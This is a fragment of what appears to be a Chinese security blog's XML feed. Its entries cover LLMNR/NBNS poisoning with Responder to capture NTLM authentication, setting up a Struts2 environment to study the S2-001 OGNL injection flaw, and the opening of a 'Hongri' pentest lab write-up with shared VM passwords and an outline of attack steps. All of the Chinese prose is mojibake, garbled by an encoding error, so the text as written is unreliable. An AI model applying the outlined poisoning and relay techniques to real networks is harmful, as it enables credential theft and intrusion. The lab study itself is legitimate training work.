NetBIOS Name Serviceï¼Œç”¨äºåœ¨åŸºäº NetBIOS åç§°è®¿é—®çš„ç½‘ç»œä¸Šæä¾›ä¸»æœºåå’Œåœ°å€æ˜ å°„æ–¹æ³•ã€‚å‡ ä¹æ‰€æœ‰å±€åŸŸç½‘éƒ½æ˜¯åœ¨NetBIOSåè®®çš„åŸºç¡€ä¸Šå·¥ä½œçš„ï¼Œæ“ä½œç³»ç»Ÿå¯ä»¥åˆ©ç”¨ WINS æœåŠ¡ã€å¹¿æ’­å’Œ Lmhost æ–‡ä»¶ç­‰ï¼Œä»¥å°†NetBIOSåç§°è§£æåˆ°ç›¸åº”çš„IP åœ°å€ã€‚</p><p>å½“ä¸€å°ä¸»æœºè¦è®¿é—®å¦ä¸€å°ä¸»æœºæ—¶ï¼Œä¼šå…ˆåœ¨è‡ªå·±æœ¬åœ°åç§°ç¼“å­˜ä¸­æŸ¥è¯¢ç›®æ ‡ä¸»æœºçš„åç§°ã€‚å¦‚æœåœ¨æœ¬åœ°ç¼“å­˜ä¸­æ²¡æœ‰æ‰¾åˆ°å¯¹åº”çš„åç§°ï¼Œé‚£ä¹ˆä¸»æœºä¼šå‘ DNS æœåŠ¡å™¨å‘é€æŸ¥è¯¢è¯·æ±‚ã€‚å¦‚æœä¸»æœºæ²¡æœ‰æ”¶åˆ°å“åº”æˆ–æ”¶åˆ°äº†é”™è¯¯çš„ä¿¡æ¯ï¼Œé‚£ä¹ˆä¸»æœºä¼šä½¿ç”¨ LLMNR æˆ– NBNS åˆ†åˆ«å‘å±€åŸŸç½‘å†…å‘é€ UDP å¤šæ’­æˆ–å¹¿æ’­è¯·æ±‚ï¼Œä»¥æŸ¥è¯¢å¯¹åº”çš„ä¸»æœºåã€‚å±€åŸŸç½‘çš„å…¶ä»–ä¸»æœºåœ¨æ”¶åˆ°è¿™ä¸ªæŸ¥è¯¢è¯·æ±‚åï¼Œä¼šå°†è¢«æŸ¥è¯¢çš„åç§°ä¸è‡ªå·±çš„ä¸»æœºåè¿›è¡Œæ¯”è¾ƒã€‚å¦‚æœä¸è‡ªå·±çš„ä¸»æœºåä¸€è‡´ï¼Œå°±å›å¤ä¸€æ¡åŒ…å«äº†è‡ªå·± IP åœ°å€çš„å•æ’­å“åº”ç»™å‘å‡ºè¯¥æŸ»è¯¢è¯·æ±‚çš„ä¸»æœºï¼Œå¦åˆ™ä¸¢å¼ƒä¹‹ã€‚</p><p>é‚£ä¹ˆæµ‹è¯•äººå‘˜å°±å¯ä»¥åœ¨è¯¥è¿‡ç¨‹ä¸­ä½¿ç”¨ä¸­é—´äººæ”»å‡»ï¼Œå½“åˆæ³•ä¸»æœºè¾“å…¥ä¸å­˜åœ¨æˆ–è€…é”™è¯¯çš„ä¸»æœºåï¼Œæµ‹è¯•äººå‘˜å°±å¯ä»¥ä»£æ›¿è¿™ä¸ªä¸»æœºè¿›è¡Œå›å¤ï¼Œå¹¶é€šè¿‡Responderç­‰å·¥å…·è¦æ±‚å—å®³æœºå™¨å‘èµ·NTLMèº«ä»½éªŒè¯ã€‚</p><h1 id="ä¸­ç»§åˆ°smbåˆ©ç”¨"><a href="#ä¸­ç»§åˆ°SMBåˆ©ç”¨" class="headerlink" title="ä¸­ç»§åˆ°SMBåˆ©ç”¨"></a>ä¸­ç»§åˆ°SMBåˆ©ç”¨</h1>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Struts2æ¼æ´å­¦ä¹ </title>
      <link href="/2024/05/10/Struts2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/05/10/Struts2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="struts2ä»‹ç»"><a href="#Struts2ä»‹ç»" class="headerlink" title="Struts2ä»‹ç»"></a>Struts2ä»‹ç»</h1><p>Struts2æ˜¯ä»¥MVCæ¶æ„ä¸ºåŸºç¡€çš„WEBæ¡†æ¶ï¼Œé€šè¿‡WEB Filterçš„æ–¹å¼å†…åµŒåœ¨WEBæœåŠ¡å™¨ä¸­è¿›è¡Œä½¿ç”¨ï¼Œä»–å¯¹servletè¿›è¡Œäº†å°è£…ã€‚</p><p>Struts2ä¸Struts1å…³ç³»ï¼šStruts2æ˜¯Strutsçš„ä¸‹ä¸€ä»£äº§å“ï¼Œæ˜¯åœ¨Struts1å’ŒWebWorkçš„æŠ€æœ¯åŸºç¡€ä¸Šè¿›è¡Œäº†åˆå¹¶çš„å…¨æ–°çš„Struts2æ¡†æ¶<br>å…¶å…¨æ–°çš„Struts2çš„ä½“ç³»ç»“æ„ä¸Struts1çš„ä½“ç³»ç»“æ„å·®åˆ«å·¨å¤§ã€‚</p><p>Struts2ä»¥WebWorkä¸ºæ ¸å¿ƒ</p><p>Struts2&#x3D;Struts1+WebWork</p><p>Struts2æ˜¯Apacheçš„äº§å“ã€‚</p><p>Struts2æ˜¯ä¸€ä¸ªæ ‡å‡†çš„MVCæ¡†æ¶ã€‚JAVAWEBä¸­çš„model2æ¨¡å¼å°±æ˜¯ä¸€ä¸ªMVCæ¨¡å¼ã€‚model2&#x3D;Servlet+jsp+JavaBean</p><p>Struts2æ¡†æ¶æ˜¯åœ¨JAVAWEBå¼€å‘ä¸­ä½¿ç”¨çš„ã€‚<br>ä½¿ç”¨Struts2æ¡†æ¶ï¼Œå¯ä»¥ç®€åŒ–æˆ‘ä»¬çš„webå¼€å‘ï¼Œå¹¶ä¸”é™ä½ç¨‹åºçš„è€¦åˆåº¦ã€‚</p><p>ç±»ä¼¼äºStruts2æ¡†æ¶çš„äº§å“ï¼šStruts1ã€webworkã€jsfï¼ˆSunæä¾›ï¼‰ã€SpringMVCéƒ½æ˜¯MVCæ¨¡å¼</p><h1 id="struts2ç¯å¢ƒé…ç½®"><a href="#Struts2ç¯å¢ƒé…ç½®" class="headerlink" title="Struts2ç¯å¢ƒé…ç½®"></a>Struts2ç¯å¢ƒé…ç½®</h1><p>è¿™é‡Œé‡‡ç”¨mavenæ·»åŠ ä¾èµ–çš„æ–¹å¼é…ç½®</p><p>è¿™é‡Œé€‰äº†ä¸€ä¸ªæœ€ä½ç‰ˆæœ¬çš„æ–¹ä¾¿æ¼æ´æµ‹è¯•</p><p><img src="http://cdn.clown2024.cn/202407151444306.png" alt="image-20240510165534126"></p><p>å¯ä»¥å®‰è£…ä¸€ä¸ªstruts2æ’ä»¶æ–¹ä¾¿é«˜äº®æ˜¾ç¤º</p><p><img src="http://cdn.clown2024.cn/202407151444307.png" alt="image-20240510165817113"></p><p>é…ç½®web.xmlçš„è¿‡æ»¤å™¨å’Œæ˜ å°„,é…ç½®å¯ä»¥å‚è€ƒå®˜ç½‘ï¼š<a href="https://struts.apache.org/getting-started/how-to-create-a-struts2-web-application#our-first-application%EF%BC%8C%E4%B8%8D%E8%BF%87%E8%BF%87%E6%BB%A4%E5%99%A8%E5%8F%AF%E8%83%BD%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%AC%E7%9A%84%E6%A1%86%E6%9E%B6%E4%B8%8D%E4%B8%80%E6%A0%B7%E9%9C%80%E8%A6%81%E8%87%AA%E5%B7%B1%E9%80%89%E6%8B%A9%EF%BC%8C%E8%BF%98%E5%8F%AF%E4%BB%A5%E4%BB%8E%E9%A1%B9%E7%9B%AE%E6%BA%90%E7%A0%81%E7%BB%99%E7%9A%84%E7%A4%BA%E4%BE%8Bwar%E5%8C%85%E4%B8%AD%E7%9A%84WEB-INF%E4%B8%8B%E7%9A%84web.xml%E6%9D%A5%E5%8F%82%E8%80%83">https://struts.apache.org/getting-started/how-to-create-a-struts2-web-application#our-first-applicationï¼Œä¸è¿‡è¿‡æ»¤å™¨å¯èƒ½ä¸åŒç‰ˆæœ¬çš„æ¡†æ¶ä¸ä¸€æ ·éœ€è¦è‡ªå·±é€‰æ‹©ï¼Œè¿˜å¯ä»¥ä»é¡¹ç›®æºç ç»™çš„ç¤ºä¾‹waråŒ…ä¸­çš„WEB-INFä¸‹çš„web.xmlæ¥å‚è€ƒ</a></p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>Basic Struts2<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.FilterDispatcher<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444308.png" alt="image-20240510190214572"></p><p>è§£é‡Šä¸€ä¸‹å„æ ‡ç­¾çš„å«ä¹‰ï¼Œé…å¾—æ¯”è¾ƒå°‘é¡ºä¾¿è®°å½•ä¸€ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;display-name&gt;ï¼šè¿™æ˜¯ä¸€ä¸ªå¯é€‰çš„æ ‡ç­¾ï¼Œç”¨äºä¸º Web åº”ç”¨æä¾›ä¸€ä¸ªæ˜¾ç¤ºåç§°ã€‚è¿™ä¸ªåç§°é€šå¸¸åœ¨éƒ¨ç½²æ—¶æˆ–é€šè¿‡åº”ç”¨æœåŠ¡å™¨çš„ç®¡ç†ç•Œé¢å±•ç¤ºã€‚<br>&lt;filter&gt;ï¼šå®šä¹‰ä¸€ä¸ªè¿‡æ»¤å™¨ï¼Œå®ƒæ˜¯ Java Servlet è§„èŒƒçš„ä¸€éƒ¨åˆ†ï¼Œç”¨äºæ‹¦æˆªè¿›å…¥ Servlet å®¹å™¨çš„è¯·æ±‚å’Œå“åº”ã€‚<br><br>&lt;filter-name&gt;ï¼šä¸ºè¿‡æ»¤å™¨æŒ‡å®šä¸€ä¸ªåç§°ï¼Œè¿™é‡Œåç§°ä¸º struts2ã€‚è¿™ä¸ªåç§°åœ¨æ•´ä¸ªåº”ç”¨ä¸­åº”è¯¥æ˜¯å”¯ä¸€çš„ï¼Œå¹¶ä¸”åœ¨åé¢å®šä¹‰ &lt;filter-mapping&gt; æ—¶ä¼šè¢«å¼•ç”¨ã€‚<br>&lt;filter-class&gt;ï¼šæŒ‡å®šè¿‡æ»¤å™¨çš„å®Œæ•´ç±»åã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œorg.apache.struts2.dispatcher.FilterDispatcher æ˜¯ Struts2 æ¡†æ¶çš„æ ¸å¿ƒè¿‡æ»¤å™¨ç±»ï¼Œå®ƒè´Ÿè´£æ‹¦æˆªè¯·æ±‚å¹¶åˆ†æ´¾ç»™ç›¸åº”çš„ Action å¯¹è±¡å¤„ç†ã€‚<br><br>&lt;filter-mapping&gt;ï¼šå®šä¹‰å¦‚ä½•å°†è¿‡æ»¤å™¨æ˜ å°„åˆ° Servlet å®¹å™¨ä¸­çš„ URL è¯·æ±‚ä¸Šã€‚<br><br>&lt;filter-name&gt;ï¼šæŒ‡å®šä¸Šé¢å®šä¹‰çš„è¿‡æ»¤å™¨çš„åç§°ï¼Œè¿™é‡Œå¼•ç”¨äº† struts2 è¿‡æ»¤å™¨ã€‚<br>&lt;url-pattern&gt;ï¼šå®šä¹‰è¿‡æ»¤å™¨å°†è¢«åº”ç”¨äºå“ªäº› URL è¯·æ±‚ã€‚/* æ˜¯ä¸€ä¸ªé€šé…ç¬¦ï¼Œè¡¨ç¤ºæ‰€æœ‰çš„ URL è¯·æ±‚éƒ½å°†è¢« struts2 è¿‡æ»¤å™¨å¤„ç†ã€‚<br><br>&lt;welcome-file-list&gt;ï¼šå®šä¹‰åº”ç”¨çš„æ¬¢è¿æ–‡ä»¶ï¼Œå½“ç”¨æˆ·è®¿é—®åº”ç”¨çš„æ ¹ç›®å½•è€Œæ²¡æœ‰æŒ‡å®šå…·ä½“é¡µé¢æ—¶ï¼ŒServlet å®¹å™¨å°†æä¾›è¿™äº›æ–‡ä»¶ã€‚<br><br>&lt;welcome-file&gt;ï¼šæŒ‡å®šæ¬¢è¿æ–‡ä»¶çš„åç§°ï¼Œè¿™é‡Œä¸º index.jspã€‚è¿™æ„å‘³ç€å½“ç”¨æˆ·è®¿é—®åº”ç”¨çš„æ ¹ URL æ—¶ï¼Œå¦‚ http://localhost:8080/YourApp/ï¼ŒServlet å®¹å™¨å°†è‡ªåŠ¨æä¾› index.jsp é¡µé¢ã€‚<br></code></pre></td></tr></table></figure><p>ç„¶åå°±æ˜¯è‡ªå·±æ·»åŠ ä¸€ä¸ªstruts2.xmlç”¨æ¥æŒ‡å®š URLã€Java ç±»å’Œè§†å›¾é¡µé¢ï¼ˆä¾‹å¦‚<code>index.jsp</code>ï¼‰ä¹‹é—´çš„å…³ç³»ï¼Œè¿™é‡Œä¹Ÿå‚è€ƒä¸Šé¢å®˜ç½‘çš„é…ç½®ï¼Œæ–‡ä»¶è·¯å¾„ä¸º<code>src/main/resources</code>ï¼Œdtdæ–‡ä»¶çš„ç‰ˆæœ¬ä¹Ÿè¦å’Œè‡ªå·±çš„æ¡†æ¶ç‰ˆæœ¬å¯¹åº”</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">struts</span> <span class="hljs-keyword">PUBLIC</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.0//EN&quot;</span></span><br><span class="hljs-meta">        <span class="hljs-string">&quot;http://struts.apache.org/dtds/struts-2.0.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts.devMode&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;true&quot;</span> /&gt;</span><br>    <span class="hljs-comment">&lt;!--æ‰€æœ‰çš„actionè¦æ”¾åœ¨packagesä¸­ï¼Œä¸”è¦ç»§æ‰¿struts-defaultåŒ…ï¼Œå› ä¸ºé‡Œé¢æ˜¯è¯¥æ¡†æ¶å°è£…çš„ä¸œè¥¿--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;basicstruts2&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--nameå¯¹åº”çš„æ˜¯è¯·æ±‚åœ°å€ï¼Œclassæ˜¯è¯·æ±‚å¤„ç†çš„ç±»--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;index&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span>&gt;</span>/index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--resultçš„nameæ˜¯Actionç±»ä¸­è¿”å›çš„å­—ç¬¦ä¸²ï¼Œå¯¹åº”ä¸åŒç›¸åº”åˆ°ä¸åŒé¡µé¢--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hello&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;action.HelloWorldAction&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;execute&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/HelloWorld.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151444309.png" alt="image-20240510191813662"></p><p><code>struts.xml</code> æ–‡ä»¶çš„ä¸»è¦ä½œç”¨åŒ…æ‹¬ï¼š</p><ol><li><strong>å®šä¹‰åŒ…ï¼ˆPackagesï¼‰</strong>ï¼šStruts 2 å…è®¸é€šè¿‡åŒ…çš„æ¦‚å¿µæ¥ç»„ç»‡å’Œéš”ç¦»ä¸åŒçš„ Action å’Œç»“æœç±»å‹ã€‚æ¯ä¸ªåŒ…å¯ä»¥æœ‰è‡ªå·±çš„å‘½åç©ºé—´ï¼Œå¹¶ä¸”å¯ä»¥é‡ç”¨å…¶ä»–åŒ…ä¸­å®šä¹‰çš„ç±»ã€‚</li><li><strong>é…ç½® Action</strong>ï¼šåœ¨ <code>struts.xml</code> ä¸­ï¼Œä½ å¯ä»¥å®šä¹‰ Actionï¼ŒåŒ…æ‹¬ Action çš„ç±»ã€æ–¹æ³•ä»¥åŠå®ƒä»¬æ˜ å°„åˆ°çš„è¯·æ±‚ URLã€‚Action æ˜ å°„å¯ä»¥æ˜¯ç®€å•çš„è·¯å¾„æ˜ å°„ï¼Œä¹Ÿå¯ä»¥æ˜¯æ›´å¤æ‚çš„å‚æ•°æ˜ å°„ã€‚</li><li><strong>ç»“æœï¼ˆResultï¼‰æ˜ å°„</strong>ï¼šä¸ºæ¯ä¸ª Action å®šä¹‰å¯èƒ½çš„ç»“æœæ˜ å°„ã€‚ç»“æœå¯ä»¥æ˜¯è½¬å‘åˆ°å¦ä¸€ä¸ªé¡µé¢ã€é‡å®šå‘åˆ°å¦ä¸€ä¸ª URLï¼Œæˆ–è€…æ˜¯è‡ªç”±æ ¼å¼çš„å­—ç¬¦ä¸²ã€‚</li><li><strong>æ‹¦æˆªå™¨ï¼ˆInterceptorsï¼‰é…ç½®</strong>ï¼šStruts 2 ä½¿ç”¨æ‹¦æˆªå™¨æ¥å¤„ç†å¦‚èº«ä»½éªŒè¯ã€æ—¥å¿—è®°å½•ã€äº‹åŠ¡ç®¡ç†ç­‰æ¨ªåˆ‡å…³æ³¨ç‚¹ã€‚åœ¨ <code>struts.xml</code> ä¸­ï¼Œå¯ä»¥å®šä¹‰æ‹¦æˆªå™¨æ ˆï¼ˆInterceptor Stacksï¼‰å’Œç‰¹å®šçš„æ‹¦æˆªå™¨ã€‚</li><li><strong>å¼‚å¸¸å¤„ç†</strong>ï¼šå®šä¹‰å…¨å±€å’Œæ“ä½œçº§åˆ«çš„å¼‚å¸¸å¤„ç†æœºåˆ¶ï¼Œå…è®¸ä½ æ•è·å’Œå¤„ç†åº”ç”¨ç¨‹åºä¸­çš„å¼‚å¸¸ã€‚</li><li><strong>ç±»å‹è½¬æ¢</strong>ï¼šé…ç½®å¦‚ä½•å°† HTTP è¯·æ±‚å‚æ•°è½¬æ¢ä¸º Action å±æ€§çš„ç±»å‹ã€‚</li><li><strong>åŒ…å«å…¶ä»–é…ç½®æ–‡ä»¶</strong>ï¼šå¯ä»¥ä½¿ç”¨ <code>&lt;include&gt;</code> æ ‡ç­¾æ¥åŒ…å«å…¶ä»–é…ç½®æ–‡ä»¶ï¼Œè¿™æœ‰åŠ©äºå°†é…ç½®åˆ†æ•£åˆ°å¤šä¸ªæ–‡ä»¶ä¸­ï¼Œä½¿ä¸»é…ç½®æ–‡ä»¶ä¿æŒç®€æ´ã€‚</li><li><strong>å¸¸é‡å’Œæ–‡æœ¬èµ„æº</strong>ï¼šå®šä¹‰å¯ä»¥åœ¨å¤šä¸ªåœ°æ–¹ä½¿ç”¨çš„å¸¸é‡ï¼Œä»¥åŠå›½é™…åŒ–çš„æ–‡æœ¬èµ„æºã€‚</li><li><strong>åŠ¨æ€æ–¹æ³•è°ƒç”¨</strong>ï¼šå…è®¸ä½ å®šä¹‰ç‰¹å®š Action å¯¹åº”çš„å¤šä¸ªæ–¹æ³•ï¼Œè¿™äº›æ–¹æ³•å¯ä»¥é€šè¿‡è¯·æ±‚å‚æ•°æ¥åŠ¨æ€è°ƒç”¨ã€‚</li></ol><p><strong>å†™ä¸€ä¸ªç®€å•ç¨‹åº</strong></p><p>ç°åœ¨æŒ‰ç…§ä¸Šé¢çš„struts.xmlçš„é…ç½®æ¥å†™ä¸€ä¸ªhellworldçš„ç¨‹åºï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> action;<br><br><span class="hljs-keyword">import</span> com.opensymphony.xwork2.Action;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloWorldAction</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Action</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello Struts2~~&quot;</span>);<br>        <span class="hljs-keyword">return</span> SUCCESS;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç›®å½•ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="http://cdn.clown2024.cn/202407151444310.png" alt="image-20240510202619138"></p><blockquote><p>é¢è¿™é‡Œé…ç½®æ—¶åˆæœ‰ä¸ªå‘ï¼Œä»–çš„webç›®å½•ä¸‹çš„æœ‰å…³struts2ä¾èµ–çš„jarå…¨éƒ½æ²¡æœ‰è‡ªåŠ¨å¯¼å…¥åˆ°WEB-INF&#x2F;libä¸‹é¢ï¼Œä¼šå¯¼è‡´å¯åŠ¨çš„å‡ºç°è¿‡æ»¤å™¨å¼‚å¸¸çš„é—®é¢˜</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151444311.png" alt="image-20240510202443723"></p><p>æ‰€ä»¥è¦åœ¨è¿™é‡ŒæŠŠå³è¾¹çš„jaråŒ…éƒ½æ·»åŠ è¿‡å»æ‰è¡Œã€‚</p><p>ç„¶åå¯åŠ¨tomcatæœåŠ¡å™¨å³å¯ã€</p><blockquote><p>éš¾ç»·åªèƒ½è¯´åˆè¢«å‘æƒ¨äº†ä¸€æ¬¡ï¼Œè®¿é—®è·¯ç”±æ˜¯éœ€è¦.actionåç¼€çš„ï¼Œä¸ç„¶å°±æ˜¯èµ„æºæœªè®¿é—®ï¼Œéš¾ç»·</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151444312.png" alt="image-20240510205435309"></p><p><img src="http://cdn.clown2024.cn/202407151444313.png" alt="image-20240510205450490"></p><p>è¦ä¿®æ”¹åç¼€å¯ä»¥åœ¨struts.xmlä¸­ä½¿ç”¨è¿™ä¸ªå±æ€§è®¾ç½®</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">constant</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;struts.action.extension&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>/&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>è¿™æ ·å­å¯ä»¥å»æ‰åç¼€ï¼Œä½†åæœæ˜¯æ‰€æœ‰jspæ–‡ä»¶éƒ½ä¸è§£æäº†ï¼Œåªèƒ½ä½¿ç”¨ä¸å¸¦åç¼€çš„è·¯ç”±ï¼Œç„¶åæ ¹ç›®å½•è®¿é—®å°±æ˜¯404è®¿é—®åŠå¤©ä¹Ÿæ‰¾ä¸åˆ°åŸå› æœäº†ï¼Œå°±è¿™æ ·å§</p></blockquote><p><img src="http://cdn.clown2024.cn/202407151444314.png" alt="image-20240510214235237"></p><p><img src="http://cdn.clown2024.cn/202407151444315.png" alt="image-20240510214249703"></p><blockquote><p>ä¸è¿‡è¿™æ ·çœ‹åˆ°åç¼€æ˜¯actionçš„è·¯ç”±å°±èƒ½å¾ˆæ˜æ˜¾çš„åˆ¤æ–­å‡ºæ˜¯statusæ¡†æ¶</p></blockquote><h1 id="s2-001è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"><a href="#S2-001è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="S2-001è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"></a>S2-001è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</h1><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://anquanke.com/post/id/254808">https://anquanke.com/post/id/254808</a></p><p>S2-001çš„æ¼æ´åŸç†æ˜¯æ¨¡æ¿æ–‡ä»¶ï¼ˆJSPï¼‰ä¸­å¼•ç”¨äº†ä¸åˆé€‚çš„æ ‡ç­¾è¿›è¡Œæ¸²æŸ“ï¼Œå¹¶ä¸”æ¸²æŸ“çš„å€¼æ˜¯ç”¨æˆ·å¯æ§çš„ï¼Œæ­¤æ—¶åˆ™è¾¾æˆäº†è¡¨è¾¾å¼æ³¨å…¥çš„ç›®çš„ã€‚</p><p>è¿™ç¯‡æ–‡ç« ä»æºç ä¸Šå»åˆ†æï¼Œååˆ†è¯¦ç»†ï¼Œæˆ‘è¿™é‡Œå°±æ€»ç»“ä¸€ä¸‹é‡ç‚¹çš„åœ°æ–¹</p><h2 id="ognlè¡¨è¾¾å¼"><a href="#OGNLè¡¨è¾¾å¼" class="headerlink" title="OGNLè¡¨è¾¾å¼"></a>OGNLè¡¨è¾¾å¼</h2><p>è¦å…ˆç®€å•äº†è§£ä¸€ä¸‹OGNLè¡¨è¾¾å¼æ˜¯ä»€ä¹ˆï¼Œå› ä¸ºè¯¥æ¼æ´å°±æ˜¯å’Œè¯¥è¡¨è¾¾å¼æ¸²æŸ“ç›¸å…³è€Œäº§ç”Ÿçš„æ¼æ´</p>]]></content>
      
      
      <categories>
          
          <category> Javaæ¡†æ¶æ¼æ´ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çº¢æ—¥é¶åœº-1</title>
      <link href="/2024/05/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/"/>
      <url>/2024/05/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/</url>
      
        <content type="html"><![CDATA[<h1 id="é¶åœºè¯´æ˜"><a href="#é¶åœºè¯´æ˜" class="headerlink" title="é¶åœºè¯´æ˜"></a>é¶åœºè¯´æ˜</h1><p>è™šæ‹Ÿæœºçš„ç»Ÿä¸€å¯†ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">hongrisec@2019<br>//æœ‰äº›é¶æœºå¯†ç è¿‡æœŸéœ€è¦æ›´æ”¹ï¼Œç»Ÿä¸€æ”¹æˆä¸‹é¢è¿™ä¸ª<br>Hongrisec@2019<br></code></pre></td></tr></table></figure><p><strong>å®˜æ–¹çš„é¶åœºæè¿°</strong></p><p>ä¸€ã€ç¯å¢ƒæ­å»º<br>1.ç¯å¢ƒæ­å»ºæµ‹è¯•<br>2.ä¿¡æ¯æ”¶é›†</p><p>äºŒã€æ¼æ´åˆ©ç”¨<br>3.æ¼æ´æœç´¢ä¸åˆ©ç”¨<br>4.åå°Getshellä¸Šä¼ æŠ€å·§<br>5.ç³»ç»Ÿä¿¡æ¯æ”¶é›†<br>6.ä¸»æœºå¯†ç æ”¶é›†</p><p>ä¸‰ã€å†…ç½‘æœé›†<br>7.å†…ç½‘â€“ç»§ç»­ä¿¡æ¯æ”¶é›†<br>8.å†…ç½‘æ”»å‡»å§¿åŠ¿â€“ä¿¡æ¯æ³„éœ²<br>9.å†…ç½‘æ”»å‡»å§¿åŠ¿-MS08-067<br>10.å†…ç½‘æ”»å‡»å§¿åŠ¿-SMBè¿œç¨‹æ¡Œé¢å£ä»¤çŒœæµ‹<br>11.å†…ç½‘æ”»å‡»å§¿åŠ¿-Oracleæ•°æ®åº“TNSæœåŠ¡æ¼æ´<br>12.å†…ç½‘æ”»å‡»å§¿åŠ¿-RPC 